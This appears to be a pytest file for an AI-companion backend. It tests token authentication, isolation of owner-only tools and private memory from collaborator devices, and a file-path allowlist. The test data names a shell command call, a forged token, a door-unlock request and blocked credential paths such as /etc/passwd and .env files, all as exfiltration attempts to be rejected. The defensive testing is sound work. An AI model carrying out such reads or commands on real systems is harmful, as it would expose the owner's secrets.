    payload = {
        "node_id": "gotchi-ryan-01",
        "session_id": "sess-sec-1",
        "prompt": "Check system status.",
    }

    # --- Case 1: auth_required=False (local dev/unit tests) + external CF headers fail-closed ---
    adapter = GotchiZeroBrainAdapter(llm_caller=fake_llm, dispatch_discord=False)
    app_default = create_zero_gotchi_app(adapter=adapter, live_mode_enabled=False)
    client_default = TestClient(app_default)

    # Local request without CF headers preserves existing behavior
    resp_local = client_default.post("/api/gotchi/brain", json=payload)
    assert resp_local.status_code == 200
    assert "Brain turn executed safely." in resp_local.json()["reply"]
    assert len(brain_calls) == 1

    # External CF-Connecting-IP (RFC 5737) fails closed even with no tokens configured
    resp_cf_ip = client_default.post(
        "/api/gotchi/brain",
        json=payload,
        headers={"CF-Connecting-IP": "203.0.113.42"},
    )
    assert resp_cf_ip.status_code == 401
    assert resp_cf_ip.json() == {
        "error": "unauthorized",
        "message": "Valid Bearer token required",
    }
    assert len(brain_calls) == 1

    # External CF-Ray (case-insensitive) fails closed even with an arbitrary Bearer token when none configured
    resp_cf_ray = client_default.post(
        "/api/gotchi/brain",
        json=payload,
        headers={
            "cf-ray": "8a1b2c3d4e5f-SJC",
            "Authorization": "Bearer forged-token",
        },
    )
    assert resp_cf_ray.status_code == 401
    assert resp_cf_ray.json() == {
        "error": "unauthorized",
        "message": "Valid Bearer token required",
    }
    assert len(brain_calls) == 1

    # With GOTCHI_BEARER_TOKEN configured, CF-routed request requires valid Bearer token
    monkeypatch.setenv("GOTCHI_BEARER_TOKEN", "valid-cf-secret-token")

    resp_cf_wrong = client_default.post(
        "/api/gotchi/brain",
        json=payload,
        headers={
            "CF-Connecting-IP": "198.51.100.77",
            "Authorization": "Bearer wrong-secret-token",
        },
    )
    assert resp_cf_wrong.status_code == 401
    assert len(brain_calls) == 1

    resp_cf_ok = client_default.post(
        "/api/gotchi/brain",
        json=payload,
        headers={
            "CF-Connecting-IP": "198.51.100.77",
            "CF-Ray": "8a1b2c3d4e5f-SJC",
            "Authorization": "Bearer valid-cf-secret-token",
        },
    )
    assert resp_cf_ok.status_code == 200
    assert "Brain turn executed safely." in resp_cf_ok.json()["reply"]
    assert len(brain_calls) == 2

    # --- Case 2: auth_required=True rejects unauthenticated even without CF headers ---
    app_auth = create_zero_gotchi_app(adapter=adapter, live_mode_enabled=False, auth_required=True)
    client_auth = TestClient(app_auth)

    resp_no_auth = client_auth.post("/api/gotchi/brain", json=payload)
    assert resp_no_auth.status_code == 401
    assert len(brain_calls) == 2

    resp_bad_auth = client_auth.post(
        "/api/gotchi/brain",
        json=payload,
        headers={"Authorization": "Bearer nope"},
    )
    assert resp_bad_auth.status_code == 403
    assert len(brain_calls) == 2

    resp_good_auth = client_auth.post(
        "/api/gotchi/brain",
        json=payload,
        headers={"Authorization": "Bearer valid-cf-secret-token"},
    )
    assert resp_good_auth.status_code == 200
    assert "Brain turn executed safely." in resp_good_auth.json()["reply"]
    assert len(brain_calls) == 3

    # --- Case 3: GOTCHI_DEVICE_TOKENS configured (verifier device token auth) ---
    monkeypatch.delenv("GOTCHI_BEARER_TOKEN", raising=False)
    monkeypatch.setenv("GOTCHI_DEVICE_TOKENS", "gotchi-ryan-01:device-secret-99")
    app_dev = create_zero_gotchi_app(adapter=adapter, live_mode_enabled=False)
    client_dev = TestClient(app_dev)

    resp_dev_unauth = client_dev.post(
        "/api/gotchi/brain",
        json=payload,
        headers={"CF-Connecting-IP": "203.0.113.99"},
    )
    assert resp_dev_unauth.status_code == 401
    assert len(brain_calls) == 3

    resp_dev_ok = client_dev.post(
        "/api/gotchi/brain",
        json=payload,
        headers={
            "CF-Connecting-IP": "203.0.113.99",
            "Authorization": "Bearer device-secret-99",
        },
    )
    assert resp_dev_ok.status_code == 200
    assert "Brain turn executed safely." in resp_dev_ok.json()["reply"]
    assert len(brain_calls) == 4

    shutdown_lomin_background_workers(timeout_s=0.5)


def test_is_owner_gotchi_node_and_cross_node_memory_and_tool_isolation(monkeypatch, tmp_path):
    # 1. Owner vs collaborator vs unknown node classification
    assert is_owner_gotchi_node("gotchi-ryan-01") is True
    assert is_owner_gotchi_node("gotchi-v1-01") is True
    assert is_owner_gotchi_node("gotchi-lomin-01") is True
    assert is_owner_gotchi_node("ryan") is True
    assert is_owner_gotchi_node("gotchi-ryan-desk") is True
    assert is_owner_gotchi_node(None, is_loopback=True) is True
    assert is_owner_gotchi_node("", is_loopback=True) is True

    for non_owner in (
        "gotchi-mike-01",
        "mike",
        "gotchi-coley-01",
        "coley",
        "gotchi-alex-01",
        "alex",
        "gotchi-mike-ryan",
        "gotchi-unknown-99",
        "esp32-guest",
        "",
        None,
    ):
        assert is_owner_gotchi_node(non_owner) is False, f"Expected non-owner: {non_owner!r}"

    # 2. Collaborator nodes do NOT load Ryan's startup snapshot or prefetch_zero_memory
    snapshot_calls: List[bool] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._load_startup_context_snapshot",
        lambda: (snapshot_calls.append(True) or "PRIVATE_USER_RYAN_MARKER tasks.json zero-chat-secret"),
    )

    owner_static = build_gotchi_static_system_instruction(node_id="gotchi-ryan-01")
    assert "PRIVATE_USER_RYAN_MARKER" in owner_static
    assert len(snapshot_calls) == 1

    collab_static = build_gotchi_static_system_instruction(node_id="gotchi-mike-01")
    assert "PRIVATE_USER_RYAN_MARKER" not in collab_static
    assert "user_ryan.md" not in collab_static
    assert "tasks.json" not in collab_static
    assert len(snapshot_calls) == 1  # _load_startup_context_snapshot was NOT called

    collab_full = build_gotchi_zero_system_prompt(
        "What is Ryan's address and private schedule?",
        has_vision=True,
        node_id="gotchi-coley-01",
    )
    assert "PRIVATE_USER_RYAN_MARKER" not in collab_full
    assert "PRE-FETCHED ZERO MEMORY" not in collab_full
    assert "Dr. Coley attached a live camera snapshot" in collab_full

    # prefetch_zero_memory returns empty string for collaborator/unknown nodes even if FTS DB exists
    assert prefetch_zero_memory("gotchi hardware companion", node_id="gotchi-mike-01") == ""
    assert prefetch_zero_memory("gotchi hardware companion", node_id="unknown-node") == ""

    # 3. _build_gotchi_tools strips owner-only tools for collaborator nodes
    collab_tools = _build_gotchi_tools(node_id="gotchi-alex-01")
    collab_tool_names = {
        d.name for t in collab_tools for d in (getattr(t, "function_declarations", None) or [])
    }
    for forbidden_tool in (
        "run_shell_command",
        "write_local_file",
        "read_local_file",
        "home_assistant_control",
        "check_calendar",
        "search_zero_memory",
        "check_tasks_and_repos",
        "post_note_to_zero_chat",
        "handoff_to_zero_runtime",
    ):
        assert forbidden_tool not in collab_tool_names

    # 4. execute_gotchi_tool_call deterministically rejects owner-only tools for collaborator nodes
    shell_calls: List[Any] = []
    ha_calls: List[Any] = []
    cal_calls: List[Any] = []
    monkeypatch.setattr("tools.gotchi_zero_adapter.subprocess.run", lambda *a, **kw: shell_calls.append(a))
    monkeypatch.setattr("tools.gotchi_zero_adapter._run_home_assistant_control_sync", lambda *a, **kw: ha_calls.append(a))
    monkeypatch.setattr("tools.gotchi_zero_adapter._run_check_calendar_sync", lambda *a, **kw: cal_calls.append(a))

    for tool_name, tool_args in (
        ("run_shell_command", {"command": "id"}),
        ("search_zero_memory", {"query": "private vault"}),
        ("home_assistant_control", {"action": "turn_off", "entity_id_or_query": "light.living_room"}),
        ("check_calendar", {"days_ahead": 3}),
        ("check_tasks_and_repos", {}),
        ("read_local_file", {"file_path": "/workspace/data/tasks.json"}),
        ("write_local_file", {"file_path": "/workspace/tmp.txt", "content": "x"}),
    ):
        res = asyncio.run(
            execute_gotchi_tool_call(tool_name, tool_args, node_id="gotchi-mike-01")
        )
        assert res.get("blocked") is True
        assert "Blocked" in str(res.get("error", ""))

    assert shell_calls == []
    assert ha_calls == []
    assert cal_calls == []

    # 5. Collaborator node cannot read #zero-chat via get_recent_discord_context
    res_zc = asyncio.run(
        execute_gotchi_tool_call(
            "get_recent_discord_context",
            {"channel_name": "zero-chat"},
            node_id="gotchi-mike-01",
        )
    )
    assert res_zc.get("blocked") is True

    # 6. handle_turn skips Home Assistant fastpath for collaborator nodes
    ha_fastpath_calls: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.try_ha_conversation_fastpath",
        lambda *a, **kw: (ha_fastpath_calls.append(a) or (True, "Unlocked front door.", {})),
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )
    adapter = GotchiZeroBrainAdapter(
        llm_caller=lambda turn: {"reply": "Collaborator turn handled."},
        dispatch_discord=False,
        ha_conversation_enabled=True,
    )
    collab_turn = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-mike-01",
                "session_id": "sess-mike-1",
                "prompt": "Unlock the front door",
            }
        )
    )
    assert ha_fastpath_calls == []
    assert collab_turn["ha_fastpath"] is False
    assert "Collaborator turn handled." in collab_turn["reply"]


def test_send_gotchi_artifact_to_zero_chat_path_allowlist_rejection(monkeypatch, tmp_path):
    delivered: List[Any] = []
    queued: List[Any] = []
    monkeypatch.setattr(
        "tools.deliver_image.deliver_file",
        lambda path, **kw: (delivered.append(path) or {"success": True}),
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: queued.append((ch, content)),
    )

    outside_file = tmp_path / "secret_outside.txt"
    outside_file.write_text("TOP SECRET")

    blocked_paths = (
        "/secrets/env.json",
        "/workspace/.env",
        "/workspace/gotchi/.env.local",
        "/workspace/memory/private/user_ryan.md",
        "/workspace/memory/vault/private_keys.md",
        "/etc/passwd",
        str(outside_file),
    )
    for bad_path in blocked_paths:
        res = send_gotchi_artifact_to_zero_chat(
            message="Exfil attempt",
            file_path=bad_path,
            mirror_gotchi_chat=True,
        )
        assert res["ok"] is False, f"Expected {bad_path} to be blocked"
        assert res["file_delivered"] is False
        assert "Blocked" in res.get("error", "")

    assert delivered == []
    assert queued == []










